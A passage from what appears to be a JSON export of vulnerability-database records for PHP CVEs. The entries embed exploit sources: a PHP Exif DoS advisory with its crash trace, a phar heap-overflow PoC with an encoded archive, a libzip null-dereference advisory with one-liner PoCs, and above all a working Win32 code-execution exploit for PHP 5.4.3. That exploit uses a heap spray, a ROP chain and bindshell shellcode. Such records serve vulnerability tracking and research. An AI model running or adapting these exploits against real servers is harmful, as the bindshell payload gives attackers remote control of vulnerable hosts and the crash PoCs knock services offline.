            "title": "PHP Exif Extension 'exif_read_data' Function Remote DoS",
            "sourceData": "Source: http://permalink.gmane.org/gmane.comp.security.oss.general/4198\r\n\r\n=====================================================================\r\nPHP Exif 64bit Casting Vulnerability\r\n=====================================================================\r\n\r\nAffected Software : PHP <= 5.3.5 (Exif extension for 64bit platforms)\r\nSeverity          : Low\r\nLocal/Remote      : Remote\r\nAuthor            : @_ikki, @paradoxengine (blog.nibblesec.org)\r\n\r\n[Summary]\r\n\r\nPHP Exif extension allows developers to work with image metadata\r\nwithin their PHP code. For instance, using exif functions it is possible\r\nto read metadata from digital camera pictures.\r\nFor further details on this file format, please refer to:\r\nhttp://www.media.mit.edu/pia/Research/deepview/exif.html\r\n\r\nPHP Exif extension for 64bit platforms is affected by a casting\r\nvulnerability that occurs during the image header parsing.\r\nAccording to our preliminary analysis, exploitation of this flaw results\r\nin Denial of Service.\r\n\r\nThis vulnerability affects PHP 5.3.5 and likely all previous versions.\r\nDuring our analysis, we have successfully tested our PoC against PHP\r\n5.3.2, PHP 5.3.3 and the latest PHP release 5.3.5.\r\n\r\nUsing the following configuration, a system is most likely vulnerable:\r\n (a) PHP 64bit version\r\n (b) PHP compiled with --enable-exif\r\n (c) memory_limit = -1\r\n\r\n[Vulnerability Details]\r\n\r\nIn case of 64bit platforms, an improper conversion occurs within\r\n\"/php-5.3.5/ext/exif/exif.c\" at line 1100 (php_ifd_get32s) and 1118\r\n(php_ifd_get32u).\r\n\r\nIn detail, an image having properly crafted Image File Directory (IFD)\r\ncan be used to trigger a segmentation fault caused by a memory access\r\nviolation:\r\n\r\n$ gdb ./sapi/cli/php\r\nGNU gdb 6.8-debian\r\nCopyright (C) 2008 Free Software Foundation, Inc.\r\nLicense GPLv3+: GNU GPL version 3 or later\r\n<http://gnu.org/licenses/gpl.html>\r\nThis is free software: you are free to change and redistribute it.\r\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show\r\ncopying\"\r\nand \"show warranty\" for details.\r\nThis GDB was configured as \"x86_64-linux-gnu\"...\r\n(gdb) run  -c /etc/php5/cli/php.ini ../exif.php ../ihaterepeating2.jpeg\r\nStarting\r\nprogram: /archive/stuff/vulnsResearch/php_exif/php-5.3.5/sapi/cli/php\r\n-c /etc/php5/cli/php.ini ../exif.php ../ihaterepeating2.jpeg\r\n[Thread debugging using libthread_db enabled]\r\n\r\n --- start ../ihaterepeating2.jpeg ---\r\n\r\n[New Thread 0x7ff7d45a26e0 (LWP 10941)]\r\n\r\nProgram received signal SIGSEGV, Segmentation fault.\r\n[Switching to Thread 0x7ff7d45a26e0 (LWP 10941)]\r\n0x000000000055e297 in php_ifd_get32s (value=0x2055000, motorola_intel=0)\r\nat /archive/stuff/vulnsResearch/php_exif/php-5.3.5/ext/exif/exif.c:1108\r\n1108                return  (((char  *)value)[3] << 24)\r\n\r\n(gdb) backtrace\r\n#0  0x000000000055e297 in php_ifd_get32s (value=0x2055000,\r\nmotorola_intel=0)\r\nat /archive/stuff/vulnsResearch/php_exif/php-5.3.5/ext/exif/exif.c:1108\r\n#1  0x000000000055e2f9 in php_ifd_get32u (value=0x2055000,\r\nmotorola_intel=0)\r\nat /archive/stuff/vulnsResearch/php_exif/php-5.3.5/ext/exif/exif.c:1120\r\n#2  0x000000000055f37e in exif_iif_add_value\r\n(image_info=0x7fff68f4e0d0,\r\nsection_index=13, name=0x7fff68f4d920 \"UndefinedTag:0x0205\", tag=517,\r\nformat=5,\r\n   length=536870913, value=0x2017124, motorola_intel=0) at\r\n       /archive/stuff/vulnsResearch/php_exif/php-5.3.5/ext/exif/exif.c:1760\r\n#3  0x000000000055f4d1 in exif_iif_add_tag (image_info=0x7fff68f4e0d0,\r\nsection_index=13, name=0x7fff68f4d920 \"UndefinedTag:0x0205\", tag=517,\r\nformat=5,\r\n   length=536870913, value=0x2017124) at\r\n       /archive/stuff/vulnsResearch/php_exif/php-5.3.5/ext/exif/exif.c:1801\r\n#4  0x00000000005625a8 in exif_process_IFD_TAG\r\n(ImageInfo=0x7fff68f4e0d0,\r\ndir_entry=0x20170e8 \"\\005\\002\\005\", offset_base=0x2016da0 \"II*\",\r\nIFDlength=7157,\r\ndisplacement=12, section_index=13, ReadNextIFD=0, tag_table=0x949740)\r\nat /archive/stuff/vulnsResearch/php_exif/php-5.3.5/ext/exif/exif.c:3115\r\n[...]\r\n\r\nWithin the PoC image, bytes in position 358-35B can be used to craft\r\nthe value of the 'components' variable (int) which is later used within\r\nmemory read operations.\r\n\r\nTwo cases appear to be interesting:\r\n\r\n{Case A - Negative value}\r\n$hexdump -C ihaterepeating.jpeg | grep -i \"03 00 00 A0\"\r\nresults in \"components=-1610612733\"\r\n\r\n{Case B - Positive value}\r\n$hexdump -C ihaterepeating2.jpeg | grep -i \"01 00 00 20\"\r\nresults in \"components=536870913\"\r\nPlease note that 0x20 = 32dec\r\n\r\nAs mentioned, the value of the 'components' variable is later computed\r\nin memory operations within another variable named 'length'.\r\nSuch value is used in a for-loop instruction (line 1745) to read image\r\nmetadata starting from a memory address.\r\n\r\nAlthough it is possible to control the offset, the following\r\ninstructions (line 1671) limit such value to positive integers only.\r\n\r\n <-- cut here -->\r\nif (length < 0) {\r\n               return;\r\n}\r\n <-- cut here -->\r\n\r\nConsequently it seems possible to oversize the expected value only,\r\nwhich results in a memory access violation.\r\n\r\n[Proof-Of-Concept]\r\n\r\nTwo images (case A and B) have been properly crafted:\r\nhttp://www.ikkisoft.com/stuff/ihaterepeating.jpeg\r\nhttp://www.ikkisoft.com/stuff/ihaterepeating2.jpeg (SegFault)\r\n\r\nYou may want to use this script to read exif data:\r\n\r\n <-- cut here -->\r\n <?php\r\necho\" --- start ---\\n\\n\";\r\nexif_read_data($argv[1]);\r\necho\" --- end ---\\n\\n\";\r\n ?>\r\n <-- cut here -->\r\n\r\n[Fix Information]\r\n\r\nn/a\r\n\r\n--\r\nLuca Carettoni\r\nPoC: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/16261.zip",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:16261"
        }
    ],
    "CVE-2012-2376": [
        {
            "bulletinFamily": "exploit",
            "description": "PHP 5.4 (5.4.3) Code Execution (Win32). CVE-2012-2376. Local exploit for windows platform",
            "modified": "2012-05-11T00:00:00",
            "published": "2012-05-11T00:00:00",
            "id": "EDB-ID:18861",
            "href": "https://www.exploit-db.com/exploits/18861/",
            "type": "exploitdb",
            "title": "PHP 5.4 5.4.3 Code Execution Win32",
            "sourceData": "// Exploit Title: PHP 5.4 (5.4.3) Code Execution 0day (Win32)\r\n// Exploit author: 0in (Maksymilian Motyl)\r\n// Email: 0in(dot)email(at)gmail.com\r\n// * Bug with Variant type parsing originally discovered by Condis\r\n// Tested on Windows XP SP3 fully patched (Polish)\r\n\r\n\r\n===================\r\n offset-brute.html\r\n===================\r\n\r\n<html><body>\r\n<title>0day</title>\r\n<center>\r\n<font size=7>PHP 5.4.3 0day by 0in & cOndis</font><br>\r\n<textarea rows=50 cols=50 id=\"log\">&lt;/textarea&gt;\r\n</center>\r\n<script>\r\nfunction sleep(milliseconds) {\r\n  var start = new Date().getTime();\r\n  for (var i = 0; i < 1e7; i++) {\r\n    if ((new Date().getTime() - start) > milliseconds){\r\n      break;\r\n    }\r\n  }\r\n}\r\nfunction makeRequest(url, parameters)\r\n{\r\n    var xmlhttp = new XMLHttpRequest();\r\n    if (window.XMLHttpRequest) {\r\n        xmlhttp = new XMLHttpRequest();\r\n        if (xmlhttp.overrideMimeType) {\r\n            xmlhttp.overrideMimeType('text/xml');\r\n        }\r\n    } else if (window.ActiveXObject) {\r\n        // IE\r\n        try { xmlhttp = new ActiveXObject(\"Msxml2.XMLHTTP\"); }\r\n        catch (e) {\r\n            try { xmlhttp = new ActiveXObject(\"Microsoft.XMLHTTP\"); }\r\n            catch (e) {}\r\n        }\r\n    }\r\n\r\n    if (!xmlhttp) {\r\n        alert('Giving up :( Cannot create an XMLHTTP instance');\r\n        return false;\r\n    }\r\n\r\n\txmlhttp.open(\"GET\",url,true);\r\n\txmlhttp.send(null);\r\n    return true;\r\n}\r\ntest=document.getElementById(\"log\");\r\nfor(offset=0;offset<300;offset++)\r\n{\r\n\tlog.value+=\"Trying offset:\"+offset+\"\\r\\n\";\r\n\tmakeRequest(\"0day.php?offset=\"+offset);\r\n\tsleep(500);\r\n}\r\n\r\n</script></body></html>\r\n\r\n\r\n\r\n===================\r\n     0day.php\r\n===================\r\n\r\n<?php \r\n\r\n$spray = str_repeat(\"\\x90\",0x200); \r\n$offset=$_GET['offset'];\r\n// 775DF0Da   # ADD ESP,10 # RETN    ** [ole32.dll] \r\n$spray = substr_replace($spray, \"\\xda\\xf0\\x5d\\x77\", (strlen($spray))*-1,(strlen($spray))*-1); \r\n// :> 0x048d0030\r\n$spray = substr_replace($spray, pack(\"L\",0x048d0030+$offset), (strlen($spray)-0x8)*-1,(strlen($spray))*-1); \r\n\r\n//0x7752ae9f (RVA : 0x0005ae7f) : # XCHG EAX,ESP # MOV ECX,468B0000 # OR AL,3 # RETN   [ole32.dll]\r\n$spray = substr_replace($spray, \"\\x9f\\xae\\x52\\x77\", (strlen($spray)-0x10)*-1,(strlen($spray))*-1); \r\n\r\n// Adress of VirtualProtect 0x7c801ad4\r\n$spray = substr_replace($spray, \"\\xd4\\x1a\\x80\\x7c\", (strlen($spray)-0x14)*-1,(strlen($spray))*-1);\r\n\r\n//  LPVOID lpAddress  = 0x048d0060\r\n$spray = substr_replace($spray, pack(\"L\",0x048d0060+$offset), (strlen($spray)-0x1c)*-1,(strlen($spray))*-1);\r\n\r\n// SIZE_T dwSize  = 0x01000000 \r\n$spray = substr_replace($spray, \"\\x00\\x00\\x10\\x00\", (strlen($spray)-0x20)*-1,(strlen($spray))*-1);\r\n\r\n// DWORD flNewProtect =  PAGE_EXECUTE_READWRITE (0x00000040) | 0xffffffc0 \r\n$spray = substr_replace($spray, \"\\x40\\x00\\x00\\x00\", (strlen($spray)-0x24)*-1,(strlen($spray))*-1);\r\n// __out  PDWORD lpflOldProtect = 0x04300070 | 0x105240000\r\n\r\n// 0x048d0068\r\n$spray = substr_replace($spray, pack(\"L\",0x048d0068+$offset), (strlen($spray)-0x28)*-1,(strlen($spray))*-1);\r\n\r\n//0x77dfe8b4 : # XOR EAX,EAX # ADD ESP,18 # INC EAX # POP EBP # RETN 0C    ** [ADVAPI32.dll]\r\n$spray = substr_replace($spray, \"\\xb4\\xe8\\xdf\\x77\", (strlen($spray)-0x18)*-1,4); \r\n// Ret Address = 0x048d0080 \r\n$spray = substr_replace($spray, pack(\"L\",0x048d0080+$offset), (strlen($spray)-0x48)*-1,4); \r\n\r\n\r\n\r\n$stacktrack = \"\\xbc\\x0c\\xb0\\xc0\\x00\"; \r\n// Universal win32 bindshell on port 1337 from metasploit\r\n$shellcode = $stacktrack.\"\\x33\\xc9\\x83\\xe9\\xb0\".\r\n  \"\\x81\\xc4\\xd0\\xfd\\xff\\xff\".\r\n  \"\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\x1d\".\r\n  \"\\xcc\\x32\\x69\\x83\\xeb\\xfc\\xe2\\xf4\\xe1\\xa6\\xd9\\x24\\xf5\\x35\\xcd\\x96\".\r\n  \"\\xe2\\xac\\xb9\\x05\\x39\\xe8\\xb9\\x2c\\x21\\x47\\x4e\\x6c\\x65\\xcd\\xdd\\xe2\".\r\n  \"\\x52\\xd4\\xb9\\x36\\x3d\\xcd\\xd9\\x20\\x96\\xf8\\xb9\\x68\\xf3\\xfd\\xf2\\xf0\".\r\n  \"\\xb1\\x48\\xf2\\x1d\\x1a\\x0d\\xf8\\x64\\x1c\\x0e\\xd9\\x9d\\x26\\x98\\x16\\x41\".\r\n  \"\\x68\\x29\\xb9\\x36\\x39\\xcd\\xd9\\x0f\\x96\\xc0\\x79\\xe2\\x42\\xd0\\x33\\x82\".\r\n  \"\\x1e\\xe0\\xb9\\xe0\\x71\\xe8\\x2e\\x08\\xde\\xfd\\xe9\\x0d\\x96\\x8f\\x02\\xe2\".\r\n  \"\\x5d\\xc0\\xb9\\x19\\x01\\x61\\xb9\\x29\\x15\\x92\\x5a\\xe7\\x53\\xc2\\xde\\x39\".\r\n  \"\\xe2\\x1a\\x54\\x3a\\x7b\\xa4\\x01\\x5b\\x75\\xbb\\x41\\x5b\\x42\\x98\\xcd\\xb9\".\r\n  \"\\x75\\x07\\xdf\\x95\\x26\\x9c\\xcd\\xbf\\x42\\x45\\xd7\\x0f\\x9c\\x21\\x3a\\x6b\".\r\n  \"\\x48\\xa6\\x30\\x96\\xcd\\xa4\\xeb\\x60\\xe8\\x61\\x65\\x96\\xcb\\x9f\\x61\\x3a\".\r\n  \"\\x4e\\x9f\\x71\\x3a\\x5e\\x9f\\xcd\\xb9\\x7b\\xa4\\x37\\x50\\x7b\\x9f\\xbb\\x88\".\r\n  \"\\x88\\xa4\\x96\\x73\\x6d\\x0b\\x65\\x96\\xcb\\xa6\\x22\\x38\\x48\\x33\\xe2\\x01\".\r\n  \"\\xb9\\x61\\x1c\\x80\\x4a\\x33\\xe4\\x3a\\x48\\x33\\xe2\\x01\\xf8\\x85\\xb4\\x20\".\r\n  \"\\x4a\\x33\\xe4\\x39\\x49\\x98\\x67\\x96\\xcd\\x5f\\x5a\\x8e\\x64\\x0a\\x4b\\x3e\".\r\n  \"\\xe2\\x1a\\x67\\x96\\xcd\\xaa\\x58\\x0d\\x7b\\xa4\\x51\\x04\\x94\\x29\\x58\\x39\".\r\n  \"\\x44\\xe5\\xfe\\xe0\\xfa\\xa6\\x76\\xe0\\xff\\xfd\\xf2\\x9a\\xb7\\x32\\x70\\x44\".\r\n  \"\\xe3\\x8e\\x1e\\xfa\\x90\\xb6\\x0a\\xc2\\xb6\\x67\\x5a\\x1b\\xe3\\x7f\\x24\\x96\".\r\n  \"\\x68\\x88\\xcd\\xbf\\x46\\x9b\\x60\\x38\\x4c\\x9d\\x58\\x68\\x4c\\x9d\\x67\\x38\".\r\n  \"\\xe2\\x1c\\x5a\\xc4\\xc4\\xc9\\xfc\\x3a\\xe2\\x1a\\x58\\x96\\xe2\\xfb\\xcd\\xb9\".\r\n  \"\\x96\\x9b\\xce\\xea\\xd9\\xa8\\xcd\\xbf\\x4f\\x33\\xe2\\x01\\xf2\\x02\\xd2\\x09\".\r\n  \"\\x4e\\x33\\xe4\\x96\\xcd\\xcc\\x32\\x69\";\r\n\r\n\r\n$spray = substr_replace($spray,$shellcode, (strlen($spray)-0x50)*-1,(strlen($shellcode))); \r\n$fullspray=\"\";\r\nfor($i=0;$i<0x4b00;$i++)\r\n{\r\n\t$fullspray.=$spray;\r\n}\r\n$j=array();\r\n$e=array();\r\n$b=array();\r\n$a=array();\r\n$c=array();\r\n\r\narray_push($j,$fullspray);\r\narray_push($e,$fullspray.\"W\");\r\narray_push($b,$fullspray.\"A\");\r\narray_push($a,$fullspray.\"S\");\r\narray_push($c,$fullspray.\"!\");\r\n\r\n\r\n$vVar = new VARIANT(0x048d0038+$offset); \r\n// Shoot him\r\ncom_print_typeinfo($vVar); //CRASH -> 102F3986   FF50 10          CALL DWORD PTR DS:[EAX+10]\r\n\r\necho $arr;\r\n\r\necho $spray;\r\n\r\n?>\r\n\r\n",
            "cvss": {
                "score": 10.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:18861"
        }
    ],
    "CVE-2012-2386": [
        {
            "bulletinFamily": "exploit",
            "description": "PHP phar extension 1.1.1 - Heap Overflow. CVE-2012-2386. Dos exploits for multiple platform",
            "modified": "2011-04-22T00:00:00",
            "published": "2011-04-22T00:00:00",
            "id": "EDB-ID:17201",
            "href": "https://www.exploit-db.com/exploits/17201/",
            "type": "exploitdb",
            "title": "PHP phar extension 1.1.1 - Heap Overflow",
            "sourceData": "from: http://0x1byte.blogspot.com/2011/04/php-phar-extension-heap-overflow.html\r\nversion PHP:  5.3.6\r\nversion phar ext.: 1.1.1\r\nsite: http://php.net/\r\nsource code: http://windows.php.net/downloads/releases/php-5.3.6-src.zip\r\n\r\nAn integer overflow vulnerability leading to a heap overflow in the file ..\\php-5.3.6\\ext\\phar\\tar.c.\r\n\r\n\r\nint phar_parse_tarfile(php_stream* fp, char *fname, int fname_len, char *alias, int alias_len, phar_archive_data** pphar, int is_data, php_uint32 compression, char **error TSRMLS_DC) /* {{{ */\r\n{\r\n//.....\r\nsize = entry.uncompressed_filesize = entry.compressed_filesize =\r\nphar_tar_number(hdr->size, sizeof(hdr->size)); //(*)\r\n//.....\r\nif (!last_was_longlink && hdr->typeflag == 'L') {\r\nlast_was_longlink = 1;\r\n/* support the ././@LongLink system for storing long filenames */\r\nentry.filename_len = entry.uncompressed_filesize;\r\nentry.filename = pemalloc(entry.filename_len+1, myphar->is_persistent); //(**)\r\n\r\nread = php_stream_read(fp, entry.filename, entry.filename_len); //(***)\r\n//.....\r\n\r\nIf entry.filename_len(which attacker can control) equal 0xffffffff, pemalloc() will allocate zero length buffer. Then php_stream_read() get as a length parameter 0xffffffff value. Because php_stream_read () checks that the passed length does not exceed the amount of data available, the buffer overflow sizes are available from the data stream.\r\n\r\nPOC code (MIME encoded):\r\nphp_phar.zip begin\r\n \r\nUEsDBBQAAAAIAA96ez4k50+6aQAAAG0AAAAIAAAAcGhhci5waHAVi0sKgzAQ\r\nQPeeYhoKTjbpAfpx1ULBhTcYghlxUJMhCnp8ze7xeO/V6KggA+CNj43jKinS\r\nnHzggEZHn421EITRrJOosc+quhcNb4i8Q3chBsnRL4xEv3/7JbLgoH5o6l0p\r\n3eZzXb7mcwJQSwMEFAAAAAgAMbB7PrO7HsFRAAAAmxAAAAwAAABwb2MucGhh\r\nci50YXLtzTsKgDAQRdFZiisQM9HJJtxEQEEbCX7A5RsrC2u18J7y8eCOU9fv\r\nZRqSPKfKzOy2h4s4V2ndmFevct590KKVF2zLGueclH+KAAAAAAB86wBQSwEC\r\nFAAUAAAACAAPens+JOdPumkAAABtAAAACAAAAAAAAAAAACAAAAAAAAAAcGhh\r\nci5waHBQSwECFAAUAAAACAAxsHs+s7sewVEAAACbEAAADAAAAAAAAAAAACAA\r\nAACPAAAAcG9jLnBoYXIudGFyUEsFBgAAAAACAAIAcAAAAAoBAAAAAA==\r\n \r\nend\r\n\r\nPHP POC:\r\n<?php if (!extension_loaded(\"phar\")) die(\"skip\");\r\n\r\n$phar = new Phar(dirname(__FILE__) . '/poc.phar.tar');\r\n\r\n?>\r\n\r\nhttps://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/17201.phar.tar (poc.phar.tar)",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:17201"
        }
    ],
    "CVE-2011-0421": [
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2014-07-01T00:00:00",
            "published": "2014-07-01T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-71487",
            "id": "SSV:71487",
            "title": "libzip 0.9.3 _zip_name_locate NULL Pointer Dereference (incl PHP 5.3.5)",
            "type": "seebug",
            "sourceData": "\n                                                Source: http://securityreason.com/securityalert/8146\r\n\r\nlibzip 0.9.3 _zip_name_locate NULL Pointer Dereference (incl PHP 5.3.5)\r\n\r\nAuthor: Maksymilian Arciemowicz\r\nhttp://securityreason.com/\r\nhttp://cxib.net/\r\nDate:\r\n- Dis.: 03.01.2011\r\n- Pub.: 18.03.2011\r\n\r\nCVE: CVE-2011-0421\r\nCERT: VU#325039\r\n\r\nAffected Software:\r\n- libzip 0.9.3\r\n- PHP 5.3.5 (fixed 5.3.6)\r\n\r\nOriginal URL:\r\nhttp://securityreason.com/achievement_securityalert/96\r\n\r\n\r\n--- 0.Description ---\r\nlibzip is a C library for reading, creating, and modifying zip archives.\r\nFiles can be added from data buffers, files, or compressed data copied\r\ndirectly from other zip archives. Changes made without closing the archive\r\ncan be reverted. The API is documented by man pages.\r\n\r\n\r\n--- 1.Description ---\r\nlibzip allows remote and local attackers to Denial of Service (Null Pointer\r\nDereference) if ZIP_FL_UNCHANGED flag is set.\r\n\r\n-lib/zip_name_locate.c---\r\nint\r\n_zip_name_locate(struct zip *za, const char *fname, int flags,\r\nstruct zip_error *error)\r\n{\r\nint (*cmp)(const char *, const char *);\r\nconst char *fn, *p;\r\nint i, n;\r\n\r\nif (fname == NULL) {\r\n_zip_error_set(error, ZIP_ER_INVAL, 0);\r\nreturn -1;\r\n}\r\n\r\ncmp = (flags & ZIP_FL_NOCASE) ? strcasecmp : strcmp;\r\n\r\nn = (flags & ZIP_FL_UNCHANGED) ? za-&#62;cdir-&#62;nentry : za-&#62;nentry; &#60;=\r\nCRASH HERE\r\n-lib/zip_name_locate.c---\r\n\r\nfor empty zip file and ZIP_FL_UNCHANGED flag, libzip should crash.\r\nCurrently for PHP, the security impact we estimate only like a remote DoS,\r\nso risk is low. \r\n\r\nProject using libzip: KDE Utilities (4.x branch), MySQL Workbench, ckmame,\r\nfuse-zip, php zip extension, Endeavour2, FreeDink\r\n\r\nBetter analysis based on PHP code ZipArchive, bellow\r\n\r\n\r\n--- 2. PHP 5.3.5 ZipArchive() ---\r\nPoC1:\r\nphp -r &#39;$nx=new\r\nZipArchive();$nx-&#62;open(&#34;/dev/null&#34;);$nx-&#62;locateName(&#34;a&#34;,ZIPARCHIVE::FL_UNCH\r\nANGED);&#39;\r\n\r\nPoC2:\r\nphp -r &#39;$nx=new\r\nZipArchive();$nx-&#62;open(&#34;empty.zip&#34;);$nx-&#62;statName(&#34;a&#34;,ZIPARCHIVE::FL_UNCHAN\r\nGED);&#39;\r\n\r\nLet&#39;s\r\n-php_zip.c-------------------------------------\r\n...\r\nstatic ZIPARCHIVE_METHOD(locateName)\r\n{\r\n...\r\nZIP_FROM_OBJECT(intern, this);\r\n\r\nif (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, &#34;s|l&#34;,\r\n&name, &name_len, &flags) == FAILURE) {\r\nreturn;\r\n}\r\n...\r\nidx = (long)zip_name_locate(intern, (const char *)name, flags); &#60;=== CRASH\r\nIN THIS FUNCTION\r\n...\r\n-php_zip.c-------------------------------------\r\n\r\nand let`s see\r\n\r\n-zip_name_locate.c-------------------------------------\r\nZIP_EXTERN(int)\r\nzip_name_locate(struct zip *za, const char *fname, int flags)\r\n{\r\nreturn _zip_name_locate(za, fname, flags, &za-&#62;error);\r\n}\r\n\r\n\r\nint\r\n_zip_name_locate(struct zip *za, const char *fname, int flags,\r\nstruct zip_error *error)\r\n{\r\nint (*cmp)(const char *, const char *);\r\nconst char *fn, *p;\r\nint i, n;\r\n\r\nif (fname == NULL) {\r\n_zip_error_set(error, ZIP_ER_INVAL, 0);\r\nreturn -1;\r\n}\r\n\r\ncmp = (flags & ZIP_FL_NOCASE) ? strcmpi : strcmp;\r\n\r\nn = (flags & ZIP_FL_UNCHANGED) ? za-&#62;cdir-&#62;nentry : za-&#62;nentry; &#60;===\r\nCRASH HERE IF ZIPARCHIVE::FL_UNCHANGED\r\nfor (i=0; i&#60;n; i++) {\r\n...\r\n-zip_name_locate.c-------------------------------------\r\n\r\n(gdb) bt\r\n#0 0x00000000006407cc in _zip_name_locate (za=0x118d520, fname=0x116ac70\r\n&#34;a&#34;, flags=32767, \r\nerror=0xffffffff00000000) at\r\n/build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c:65\r\n#1 0x00000000006381e6 in c_ziparchive_locateName (ht=2,\r\nreturn_value=0x1169418, return_value_ptr=0xffffffff, \r\nthis_ptr=0x118d530, return_value_used=-176126592) at\r\n/build/buildd/php5-5.3.3/ext/zip/php_zip.c:1877\r\n#2 0x00000000006e986a in zend_do_fcall_common_helper_SPEC\r\n(execute_data=0x7ffff7eb7068)\r\nat /build/buildd/php5-5.3.3/Zend/zend_vm_execute.h:316\r\n#3 0x00000000006c0b00 in execute (op_array=0x1168568) at\r\n/build/buildd/php5-5.3.3/Zend/zend_vm_execute.h:107\r\n...\r\n\r\nProgram received signal SIGSEGV, Segmentation fault.\r\n0x00000000006407cc in _zip_name_locate (za=0x118d520, fname=0x1169400\r\n&#34;9223372036854775808&#34;, flags=32767, \r\nerror=0xffffffff00000000) at\r\n/build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c:65\r\n65 n = (flags & ZIP_FL_UNCHANGED) ? za-&#62;cdir-&#62;nentry :\r\nza-&#62;nentry;\r\n(gdb) print za-&#62;cdir-&#62;nentry\r\nCannot access memory at address 0x8\r\n(gdb) print za-&#62;nentry\r\n$21 = 0\r\n\r\nbecause \r\n\r\n(gdb) x/i $rip\r\n=&#62; 0x6407cc &#60;_zip_name_locate+236&#62;: mov 0x8(%rax),%eax\r\n(gdb) x/i $rax\r\n0x0: Cannot access memory at address 0x0\r\n(gdb) x/i $eax\r\n\r\ncall to zip_name_locate\r\n\r\n(gdb) n\r\n1877 idx = (long)zip_name_locate(intern, (const char *)name,\r\nflags);\r\n(gdb) print intern\r\n$24 = (struct zip *) 0x118d580\r\n(gdb) x/x intern\r\n0x118d580: 0x0118d220\r\n(gdb) x/40x intern\r\n0x118d580: 0x0118d220 0x00000000 0x0118d340 0x00000000\r\n0x118d590: 0x00000000 0x00000000 0x00000000 0x00000000\r\n0x118d5a0: 0x00000000 0x00000000 0x00000000 0x00000000\r\n0x118d5b0: 0x00000000 0x00000000 0xffffffff 0x00000000\r\n0x118d5c0: 0x00000000 0x00000000 0x00000000 0x00000000\r\n0x118d5d0: 0x00000000 0x00000000 0x00000000 0x00000000\r\n0x118d5e0: 0x00000000 0x00000000 0x00020a21 0x00000000\r\n0x118d5f0: 0x00000000 0x00000000 0x00000000 0x00000000\r\n0x118d600: 0x00000000 0x00000000 0x00000000 0x00000000\r\n0x118d610: 0x00000000 0x00000000 0x00000000 0x00000000\r\n\r\n\r\nnext PoC2\r\n\r\n$nx=new\r\nZipArchive();$nx-&#62;open(&#34;empty.zip&#34;);$nx-&#62;statName(&#34;9223372036854775808&#34;,&#34;92\r\n23372036854775807&#34;);\r\nrogram received signal SIGSEGV, Segmentation fault.\r\n0x00000000006407cc in _zip_name_locate (za=0x118d520, fname=0x11693f0\r\n&#34;9223372036854775808&#34;, flags=32767, \r\nerror=0xffffffffffffdac0) at\r\n/build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c:65\r\n65 in /build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c\r\n(gdb) bt\r\n#0 0x00000000006407cc in _zip_name_locate (za=0x118d520, fname=0x11693f0\r\n&#34;9223372036854775808&#34;, flags=32767, \r\nerror=0xffffffffffffdac0) at\r\n/build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c:65\r\n#1 0x0000000000640a50 in zip_stat (za=0x118d520, fname=0x11693f0\r\n&#34;9223372036854775808&#34;, flags=-1, \r\nst=0x7fffffffda70) at\r\n/build/buildd/php5-5.3.3/ext/zip/lib/zip_stat.c:45\r\n#2 0x0000000000638451 in c_ziparchive_statName (ht=2,\r\nreturn_value=0x1169480, return_value_ptr=0xffffffff, \r\nthis_ptr=0x118d530, return_value_used=-176126592) at\r\n/build/buildd/php5-5.3.3/ext/zip/php_zip.c:1818\r\n#3 0x00000000006e986a in zend_do_fcall_common_helper_SPEC\r\n(execute_data=0x7ffff7eb7068)\r\nat /build/buildd/php5-5.3.3/Zend/zend_vm_execute.h:316\r\n\r\n\r\n--- 3. Fix ---\r\nThis issue has been fixed with PHP Team, so big thanks guys.\r\n\r\nhttp://www.php.net/ChangeLog-5.php#5.3.6\r\n\r\nhttp://svn.php.net/viewvc/php/php-src/branches/PHP_5_3/ext/zip/lib/zip_name\r\n_locate.c?annotate=307867\r\n\r\n\r\n--- 4. Greets ---\r\nSpecial thanks for Pierre Joye and Stas\r\n\r\nsp3x, Infospec,\r\n\r\n\r\n--- 5. Contact ---\r\nAuthor: Maksymilian Arciemowicz\r\n\r\nEmail:\r\n- cxib {a\\./t] securityreason [d=t} com\r\n\r\nGPG:\r\n- http://securityreason.com/key/Arciemowicz.Maksymilian.gpg\r\n\r\nhttp://securityreason.com/\r\nhttp://cxib.net/\r\n\n                              ",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:71487"
        },
        {
            "bulletinFamily": "exploit",
